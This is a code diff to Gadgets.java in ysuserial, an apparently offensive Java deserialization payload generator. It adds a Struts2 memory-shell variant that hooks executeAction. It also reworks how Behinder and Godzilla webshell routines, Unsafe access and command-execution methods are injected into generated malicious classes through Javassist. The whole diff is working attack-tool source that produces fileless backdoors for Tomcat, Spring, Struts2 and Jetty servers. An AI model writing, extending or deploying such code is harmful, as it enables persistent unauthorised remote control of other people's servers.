@@ -6,8 +6,7 @@ import static org.su18.ysuserial.Strings.converString;
 import static org.su18.ysuserial.payloads.config.Config.*;
 import static org.su18.ysuserial.payloads.templates.MemShellPayloads.*;
 import static org.su18.ysuserial.payloads.util.ClassNameUtils.generateClassName;
-import static org.su18.ysuserial.payloads.util.Utils.base64Decode;
-import static org.su18.ysuserial.payloads.util.Utils.writeClassToFile;
+import static org.su18.ysuserial.payloads.util.Utils.*;
 
 import java.io.ByteArrayOutputStream;
 import java.lang.reflect.*;
@@ -113,6 +112,8 @@ public class Gadgets {
 					packageName += "tomcat.";
 				} else if ("sp".equals(prefix)) {
 					packageName += "spring.";
+				} else if ("st".equals(prefix)) {
+					packageName += "struts2.";
 				} else if ("jf".equals(prefix) || "js".equals(prefix)) {
 					packageName += "jetty.";
 				} else if ("rf".equals(prefix) || "rs".equals(prefix)) {
@@ -260,6 +261,12 @@ public class Gadgets {
 			}
 
 			classBytes = ctClass.toBytecode();
+
+			// Struts2ActionMS 额外处理
+			if (className.contains("Struts2ActionMS")) {
+				insertField(ctClass, "thisClass", "public static String thisClass = \"" + base64Encode(classBytes) + "\";");
+				classBytes = ctClass.toBytecode();
+			}
 		}
 
 		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
@@ -373,7 +380,12 @@ public class Gadgets {
 		boolean isWebflux = name.contains("Webflux");
 
 		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
-		String method = name.contains("SpringControllerMS") ? "drop" : "";
+		String method = "";
+		if (name.contains("SpringControllerMS")) {
+			method = "drop";
+		} else if (name.contains("Struts2ActionMS")) {
+			method = "executeAction";
+		}
 
 		List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
 		classes.add(ctClass.getSuperclass());
@@ -391,7 +403,11 @@ public class Gadgets {
 		insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(HEADER_VALUE) + ";");
 
 		if ("bx".equals(type)) {
-			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+			try {
+				ctClass.getDeclaredMethod("base64Decode");
+			} catch (NotFoundException e) {
+				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+			}
 
 			try {
 				ctClass.getDeclaredMethod("getFieldValue");
@@ -399,7 +415,21 @@ public class Gadgets {
 				ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
 			}
 
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
+			try {
+				ctClass.getDeclaredMethod("getMethodByClass");
+			} catch (NotFoundException e) {
+				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
+			}
+
+			try {
+				ctClass.getDeclaredMethod("getMethodAndInvoke");
+			} catch (NotFoundException e) {
+				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+			}
+
+			if (IS_OBSCURE) {
+				ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
+			}
 
 			String shell = "";
 			if (isTomcat) {
@@ -415,7 +445,12 @@ public class Gadgets {
 			insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
 			insertField(ctClass, "PASS", "String PASS = " + converString(PASSWORD_ORI) + ";");
 
-			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+			try {
+				ctClass.getDeclaredMethod("base64Decode");
+			} catch (NotFoundException e) {
+				ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+			}
+
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
@@ -483,10 +518,11 @@ public class Gadgets {
 	 */
 	public static void insertCMD(CtClass ctClass) throws Exception {
 
+		ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
+
 		if (IS_OBSCURE) {
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(TO_CSTRING_Method), ctClass));
-			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
 			try {
 				ctClass.getDeclaredMethod("getFieldValue");
@@ -495,6 +531,12 @@ public class Gadgets {
 			}
 			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD_OBSCURE), ctClass));
 		} else {
+			try {
+				ctClass.getDeclaredMethod("getMethodAndInvoke");
+			} catch (NotFoundException e) {
+				ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+			}
+
 			ctClass.addMethod(CtMethod.make(base64Decode(EXEC_CMD), ctClass));
 		}
 	}
